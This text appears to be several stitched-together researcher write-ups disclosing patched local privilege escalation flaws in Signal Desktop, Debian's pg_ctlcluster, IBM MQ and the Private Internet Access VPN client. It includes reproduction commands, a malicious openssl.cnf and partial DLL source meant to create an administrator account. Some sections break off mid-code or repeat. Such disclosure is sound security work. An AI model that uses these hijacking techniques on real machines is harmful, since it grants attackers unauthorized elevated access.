Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

A Windows utility written in C++ to check for potential insecure paths used by the OPENSSLDIR build parameter in OpenSSL libraries. Applications that bundle OpenSSL libraries may have OPENSSLDIR set to a path that could be writable from a low privileged user account. Depending on how the application is written, it may automatically load OPENSSLDIR/openssl.cnf during startup or other specific conditions.

The openssl.cnf configuration file can be leveraged to load a malicious OpenSSL Engine library resulting in the execution of arbitrary code with the authority of the account running the vulnerable application. For a detailed example of how I obtained SYSTEM with the Private Internet Access Desktop VPN client, read <https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/>. Information on how this works is described at <https://wiki.openssl.org/index.php/Library_Initialization>.

Additional functionality will be added as time permits. Here is functionality I may implement.

* Check permissions on all folders listed in the OPENSSLDIR path
* Check permissions of OPENSSLDIR/openssl.cnf
* Check permissions of OPENSSL\_ENGINES\_DIR for OpenSSL 1.1+
* Create option to search the file system for OpenSSL libraries
* Logging
* XMl/json output

## Download

The binaries can be downloaded directly from the CI [build server](https://ci.appveyor.com/project/mirchr/openssldir-check?branch=master). Click on the desired platform and then select Artifacts. Note: This is a temporary solution. Long term the binaries will be available directly from Github.

## Usage

Note: Do not use this on untrusted paths. The utility attempts to load the library and call the OpenSSL function to determine the version and OPENSSLDIR path.

```
# OpenSSL v1.1+
openssldir_check <path/to/libcrypto-<version>.dll>

# OpenSSL < v1.1
openssldir_check <path/to/libeay32.dll>

```

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png?w=712)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is my goto Windows utility for understanding how applications interact with the file system, registry, and process creation. I am especially interested in services since most execute with higher privileges. The latest PIA desktop application runs a service(pia-service.exe) at startup using the local SYSTEM account. This service handles privileged operations on behalf of the client.

Procmon has a feature to run at boot time. This is especially helpful for obtaining information on the various services that startup. To enable this, simply select Options / Enable Boot Logging. After you click “Enable Boot Logging”, a new window will appear. Click the “OK” button. Close Procmon and reboot the system.

![procmon-enable-boot](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-enable-boot.png?w=298&h=278)![]()![procmon-enable-boot-2ndprompt](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-enable-boot-2ndprompt.png?w=712)

After the system reboots, login and open Procmon. Adjust the filter to the following criteria. This will show attempts to access files that do not exist by any user that begins with NT. After the filter is applied you will be prompted to save the boot time PML file. Select a location and click ok. This may take a while to load.![procmon-post-boot-filter](https://blog.mirch.io/wp-content/uploads/2019/06/procmon-post-boot-filter.png?w=712)

With Procmon I generally look for paths that a low privileged user may have write access to such as C:\ProgramData, C:\users\, c:\Windows\Temp, or directories located at the root of the drive. When researching PIA I noticed it attempted to open c:\etc\ssl\openssl.cnf.  I was interested to see if this configuration file could be leveraged. I had used an openssl.cnf in the past, but only for creating TLS certificates.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png?w=712)

When looking for privilege escalation opportunities I want to understand built-in functionality and find ways to abuse it. A low privileged user is allowed to create directories under c:\ so I can control the path. /etc/ssl is a Linux path which is interesting but most likely the application was [cross compiled](https://en.wikipedia.org/wiki/Cross_compiler). Windows systems support the Linux path convention so “/” is translated to the root of the drive C:\.

Reading the OpenSSL [config(5)](https://www.openssl.org/docs/manmaster/man5/config.html) documentation I noticed the configuration allows for external “Engine” libraries to be loaded. I also found a working [example](https://github.com/ThomasHabets/openssl-tpm-engine/blob/master/openssl.cnf.sample) on Github.

At this point it appeared that I may have the capability to trick a process running as SYSTEM to load a DLL that I create. I created a new openssl.cnf file using the example as a template. The only real change was the path to the library. This needed to be changed where the PIA service was reading from.

```
# Malicious openssl.cnf
openssl_conf = openssl_init
[openssl_init]
engines = engine_section

[engine_section]
woot = woot_section

[woot_section]
engine_id = woot
dynamic_path = c:\\etc\\ssl\\woot.dll
init = 0

```

Now that the configuration is ready the last step was to create a malicious library. There are many options for doing this but I already had a simple DLL ready from other research projects. When loaded, this code will execute [net user](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865%28v%3Dws.11%29) commands to create a local administrator account named “woot”. No attempt was made to be stealthy. I plan to make an enhanced version in the future and will post details when completed. After compiling woot.dll I copied it to c:\etc\ssl as low privileged user.

```
/* Cross Compile with
   x86_64-w64-mingw32-g++ woot.c -o woot.dll -shared
*/
#include < windows.h>
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:

A low privileged user cannot restart the PIA service so a reboot is required. I setup Procmon to run on boot like before and then rebooted the system. This post-boot image shows the pia-service.exe running as SYSTEM and loading the woot.dll library. ![pia-openssl-engine-loading](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-engine-loading.png?w=712)

Login as the newly created woot local administrator account.![woot-cmd](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=712)

I have discovered the same vulnerability with multiple products so I decided to make a utility to automate OpenSSL libraries by extracting the version and OPENSSLDIR value. The project can be found at <https://github.com/mirchr/openssldir_check/>. Here is a screenshot of what openssldir\_check shows for the vulnerable version of PIA. Note that OPENSSLDIR is set to “/etc/ssl”. This translates to c:\etc\ssl on Windows.

### **Summary**

Any Windows client or server application that bundles OpenSSL libraries should be reviewed to ensure that the OPENSSLDIR is not set to a path that could be writable from a low privileged user account.

I worked directly with the vendor(London Trust Media) and all of the vulnerabilities have been patched. It was a pleasure working with the security team at PIA. They were responsive and I appreciate the partnership to resolve the issues.

### **Test Environment**

OS: Windows 10 Pro 10.0.17763

PIA Version: 1.0.2 (build 02363)
